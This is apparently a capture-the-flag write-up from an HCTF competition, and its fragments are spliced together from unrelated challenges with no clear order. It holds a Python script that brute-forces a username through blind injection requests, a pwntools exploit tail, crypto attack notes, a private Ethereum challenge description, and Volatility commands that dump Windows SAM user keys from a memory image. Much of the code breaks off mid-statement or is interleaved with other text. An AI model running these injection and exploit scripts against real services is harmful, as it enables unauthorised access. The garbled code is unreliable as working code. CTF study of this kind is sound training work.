SUPERVISOR_PROCESS_NAME=uwsgi
LISTEN_PORT=80
STATIC_INDEX=0    
PWD=/app/hard_t0_guess_n9f5a95b5ku9fg
STATIC_PATH=/app/static
PYTHONPATH=/app
UWSGI_RELOADS=0
#encoding:utf-8
import requests
import string
import base64
import random
def catch(num,str1):
    a=0
    b=97
    while(a\n\t\t\t\t\t\t\n\t\t\t\t\t\t\t1\n\t\t\t\t\t\t\n\t\t\t\
t\t\t\n\t\t\t\t\t\t\tadmin')
        print usernew
        index2=sss.index(usernew)
        print index1
        print index2
        if index1 > index2:
            b =  mid -1
        else:
            a = mid +1
    tmp =hex(a-1)[2:]
    if len(tmp)==1:
        tmp="0"+tmp
    return "%"+tmp
    #print "##################################"
    # found=False
Crypto
xor game
xor key length = 21 xor_is_interesting!@#
rsa?xor
 2048bit,  40bit Coppersmith’s short-pad attack http://inaz2
.hatenablog.com/entry/2016/01/20/022936 coppersmithﬂag
BlockChain
Re:Ethereum from zero
-> ﬁrst, you need connect my private ethereum blockchain, networkid is 111 -> second, use
sha3.keccak_256(your token) as your ethereum private key, and you can calculate your ethereum
account address -> third, if your account balance > 0, you can get ﬂag1 -> use getﬂag2 to exec
Smart contract getﬂag function and if you pass the function, I will give you ﬂag2 -> ﬁnally, ﬂag is:
hctf{ﬂag1+ﬂag2}
enode://e4bef62d1c7854093d5ceea236bd9c438c7d12a1ﬀ86c0cf57c43a8cecda5f7a2ceef9c1397e
695fee3f128b2c6dca2a756ca569877e7b2c2f1f4cde5636d8a7
if __name__ == "__main__":
    #payloads = list(string.ascii_lowercase)
    #payloads.append("_;")
    payloads='!"#$%&\'()*+,-./:;?
@0123456789abcdefghijklmnopqrstuvwxyz[\\]^_`{|}~'
    #payloads = list('sysadmin:0123456789_abcdefghijklmnopqrstuvwxyz 
,ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789')
    user='%44%53%41%38%26%26%21%40%23%24%25'
    for i in range(1,100):
        user = user+catch(i,user)
        print "now user is "+user
    #catch(5,"dsa8 1000):
            print i, yf[i]
            ans.append(i)
    print ans
    p.sendline("%d %d %d %d" % (ans[0], ans[1], ans[2], ans[3]))
p.interactive()
https://www.jianshu.com/p/6438bc3302c8  volatility -f mem.data imageinfo
Volatility Foundation Volatility Framework 2.4 Determining proﬁle based on KDBG search...
 volatility -f mem.data --proﬁle=Win2008R2SP0x64 printkey -K
"SAM\Domains\Account\Users\Names" Volatility Foundation Volatility Framework 2.4 Legend: (S)
= Stable (V) = Volatile
Registry: \SystemRoot\System32\Conﬁg\SAM Key name: Names (S) Last updated: 2018-11-05
14:22:03 UTC+0000
Subkeys: (S) Administrator (S) Guest (S) veritas501
Values: REG_DWORD : (S) 0
 volatility -f mem.data --proﬁle=Win2008R2SP0x64
dump,memdump volatility -f mem.data
memdump -p 'pid' -D '/path'
dump
GIMP
      Suggested Profile(s) : Win2008R2SP0x64, Win7SP1x64, Win7SP0x64, 
Win2008R2SP1x64
                 AS Layer1 : AMD64PagedMemory (Kernel AS)
                 AS Layer2 : FileAddressSpace (/root/Desktop/mem.data)
                  PAE type : No PAE
                       DTB : 0x187000L
                      KDBG : 0xf80004035070
      Number of Processors : 4
 Image Type (Service Pack) : 0
            KPCR for CPU 0 : 0xfffff80004036d00L
            KPCR for CPU 1 : 0xfffff880009ee000L
            KPCR for CPU 2 : 0xfffff88004568000L
            KPCR for CPU 3 : 0xfffff880045dd000L
         KUSER_SHARED_DATA : 0xfffff78000000000L
       Image date and time : 2018-11-07 08:26:52 UTC+0000
 Image local date and time : 2018-11-07 16:26:52 +0800
Diﬃcult programming language
malbolge
ﬂag Q7
Flagtql
Guess My Key
bp
D'`;M?!\mZ4j8hgSvt2bN);^]+7jiE3Ve0A@Q=|;)sxwYXtsl2pongOe+LKa'e^]\a`_X|V[Tx;"VO
NSRQJn1MFKJCBfFE>&1:
            t = 1
        if t  c2:
            print(c2)
            guess_flag[i%96] = abs(1-ff)
        else:
            print(c1)
            guess_flag[i%96] = ff
        #guess_flag = bp(s,guess_out,flag_n,guess_flag)
        #guess_flag = toint(guess_flag)
        print(guess_flag)